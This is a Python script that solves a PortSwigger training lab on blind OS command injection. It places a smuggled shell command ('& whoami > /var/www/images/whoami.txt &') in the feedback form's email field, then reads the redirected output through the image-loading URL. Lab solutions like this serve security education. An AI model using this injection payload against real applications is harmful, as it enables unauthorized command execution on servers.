#!/usr/bin/env python


'''This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

/var/www/images/
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

Lab link: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0aa500ea0471050381845d6300de00ac' #change based on generated lab
payload ='& whoami > /var/www/images/whoami.txt &' # whoami output redirected
s = requests.session()

def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']

def main():
    uri = f"https://{lab_id}.web-security-academy.net/feedback"  # go here first to get the csrf token
    r1 = s.get(uri) 
    token = token_extract(r1.text) # feedback csrf token

    # Trigger os injection from the feedback submission
    uri = f"https://{lab_id}.web-security-academy.net/feedback/submit"
    data = {
        'csrf': token,
        'name' : 'hey', 
        'email' : payload,
        'subject' : 'hey',
        'message' : 'hey'
    }
    r2 = s.post(uri, data=data)
    
    # Get the response from the an image viewer link and finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/image?filename=whoami.txt"
    r3 = s.get(uri) 
    print(r3.text)
    print('done')

if __name__ == '__main__':
    main()